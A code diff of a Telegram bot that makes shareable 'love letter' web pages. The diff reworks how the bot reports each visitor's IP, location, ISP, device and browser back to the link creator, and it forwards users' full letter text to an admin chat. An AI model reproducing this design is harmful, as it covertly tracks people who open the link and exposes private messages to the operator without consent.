@@ -3,13 +3,6 @@ const path = require('path');
 const { Telegraf, Markup } = require('telegraf');
 const fs = require('fs');
 const https = require('https');
-const admin = require('firebase-admin');
-
-const serviceAccount = JSON.parse(process.env.FIREBASE_CONFIG);
-admin.initializeApp({
-  credential: admin.credential.cert(serviceAccount),
-  databaseURL: "https://loveletter-4a9d8-default-rtdb.firebaseio.com/"
-});
 
 const app = express();
 app.use(express.json());
@@ -385,9 +378,10 @@ bot.action(/^view_vi_(.+)$/, async (ctx) => {
     const linkId = ctx.match[1];
     const data = db.linkDatabase[linkId];
     if (!data) return ctx.answerCbQuery("⚠️ লিঙ্কটি ডাটাবেজে পাওয়া যায়নি।", { show_alert: true });
-    
+    ctx.answerCbQuery();
+
     if (!data.visitors || data.visitors.length === 0) {
-        return ctx.answerCbQuery("ℹ️ এই লিঙ্কটি এখনও কেউ ওপেন করেনি।", { show_alert: true });
+        return ctx.reply("ℹ️ এই লিঙ্কটি এখনও কেউ ওপেন করেনি।");
     }
 
     let report = `👤 Visitor Details for Link [ ${linkId} ]:\n\n`;
@@ -395,11 +389,11 @@ bot.action(/^view_vi_(.+)$/, async (ctx) => {
         report += `${index + 1}. 🗓️ Time: ${v.time}\n🌐 IP: ${v.ip}\n🌍 Country: ${v.country} | City: ${v.city}\n📡 ISP: ${v.isp}\n📱 Device/OS: ${v.os}\n🌐 Browser: ${v.browser}\n\n`;
     });
 
-    if (report.length > 200) {
-        report = report.substring(0, 197) + "...";
+    if (report.length > 4000) {
+        report = report.substring(0, 3900) + "\n...[Truncated due to length limit]";
     }
 
-    ctx.answerCbQuery(report, { show_alert: true });
+    ctx.reply(report);
 });
 
 bot.on('photo', async (ctx) => {
@@ -513,7 +507,7 @@ bot.on('text', async (ctx) => {
 
     try {
         if (session.step === 'AWAITING_ANIMATION_TEXT') {
-            const lines = text.split(/[\n,痕]+/).map(l => l.trim()).filter(l => l.length > 0);
+            const lines = text.split(/[\n,]+/).map(l => l.trim()).filter(l => l.length > 0);
             if (!lines.length) return ctx.reply("⚠️ অনুগ্রহ করে অন্তত একটি messagebox বা টেক্সট লিখুন।");
             
             db.userSessions[userId].animations = lines;
@@ -537,21 +531,32 @@ function processFinalLinkCreation(ctx, letterText) {
     db.totalLinksCreated = (db.totalLinksCreated || 0) + 1;
 
     let finalCountdownIso = null;
+    let countdownDisplay = "No Countdown ❌";
+    
     if (session.pendingMinutes) {
         const targetDate = new Date();
         targetDate.setMinutes(targetDate.getMinutes() + session.pendingMinutes);
         finalCountdownIso = targetDate.toISOString();
+        countdownDisplay = `${session.pendingMinutes} Minutes ✅`;
     }
 
     const uniqueId = Math.random().toString(36).substring(2, 9);
     const finalGeneratedUrl = `${SERVER_URL}/love/${uniqueId}`;
-    
     const dbImageUrl = session.imageUrl ? `${SERVER_URL}${session.imageUrl}` : null;
 
     db.linkDatabase[uniqueId] = {
-        userId, name: session.name || "User", username: session.username || "None", type: session.type || "love",
-        music: session.music || "", countdown: finalCountdownIso, animations: session.animations, letter: letterText, 
-        answer: null, image: dbImageUrl, imagePath: session.imageUrl || null, visitors: []
+        userId, 
+        name: session.name || "User", 
+        username: session.username || "None", 
+        type: session.type || "love",
+        music: session.music || "", 
+        countdown: finalCountdownIso, 
+        animations: session.animations, 
+        letter: letterText, 
+        answer: null, 
+        image: dbImageUrl, 
+        imagePath: session.imageUrl || null, 
+        visitors: []
     };
     
     ctx.reply(`আপনার লিংক তৈরি করা হয়েছে।\n\nলিংক: \`${finalGeneratedUrl}\``, {
@@ -559,18 +564,22 @@ function processFinalLinkCreation(ctx, letterText) {
         ...Markup.inlineKeyboard([[Markup.button.callback("❌ Link Off", `delete_link_${uniqueId}`)]])
     }).catch(() => {});
 
-    let adminNotificationText = `নতুন লিংক তৈরি করা হয়েছে।
-Name: ${session.name || "User"}
-ID: ${userId}
-Username: ${session.username || "None"}
-Category: ${String(session.type || "love").toUpperCase()}
-Image Included: ${dbImageUrl ? "Yes ✅" : "No ❌"}`;
+    let adminNotificationText = `🆕 নতুন লিংক তৈরি করা হয়েছে।
+👤 Name: ${session.name || "User"}
+🆔 ID: ${userId}
+🏷️ Username: ${session.username || "None"}
+📂 Category: ${String(session.type || "love").toUpperCase()}
+⏳ Countdown: ${countdownDisplay}
+📸 IMG Included: ${dbImageUrl ? "Yes ✅" : "No ❌"}`;
 
     if (dbImageUrl) {
-        adminNotificationText += `\nimg link: ${dbImageUrl}`;
+        adminNotificationText += `\n🖼️ IMG Link: ${dbImageUrl}`;
     }
 
-    adminNotificationText += `\nLink: ${finalGeneratedUrl}`;
+    adminNotificationText += `
+✨ Animation txt: ${session.animations ? session.animations.join(', ') : "None"}
+💌 Letter: ${letterText}
+🔗 Main Link: ${finalGeneratedUrl}`;
 
     bot.telegram.sendMessage(ADMIN_CHAT_ID, adminNotificationText, Markup.inlineKeyboard([
         [Markup.button.callback("👀 Check Answer", `view_ans_${uniqueId}`), Markup.button.callback("👤 Visitor Info", `view_vi_${uniqueId}`)]
